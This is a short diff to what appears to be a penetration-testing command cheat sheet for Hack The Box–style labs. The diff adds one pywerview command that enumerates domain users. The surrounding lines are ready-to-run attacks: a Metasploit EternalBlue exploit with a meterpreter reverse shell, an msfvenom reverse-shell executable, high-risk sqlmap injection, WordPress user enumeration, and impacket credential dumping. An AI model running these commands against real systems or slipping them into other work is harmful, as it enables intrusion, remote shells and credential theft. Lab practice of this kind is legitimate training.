@@ -18,6 +18,7 @@ sqlmap -u "http://$(IP)/vuln.php?id=1" --batch --level=5 --risk=3 --threads=10 -
 wpscan --url http://$(IP) --enumerate u --api-token YOUR_WPSCAN_API_TOKEN
 wpscan --url http://www.smol.htb --enumerate ap,at,cb,u,tt,dbe,m --plugins-detection mixed --api-token YOUR_WPSCAN_API_TOKEN --disable-tls-checks --force
 msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $(IP); set LHOST $(IP); set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LPORT 4444; exploit"
+pywerview get-netuser -u user -p 'pass' -w inlanefreight.local -t 192.168.0.1 --username targetuser
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(IP) LPORT=4444 -f exe -o shell.exe
 impacket-smbclient \\$(IP)\IPC$ -username 'User' -password 'Pass'
 impacket-secretsdump -hashes :NT 'DOMAIN/Administrator:Password'@$(IP)
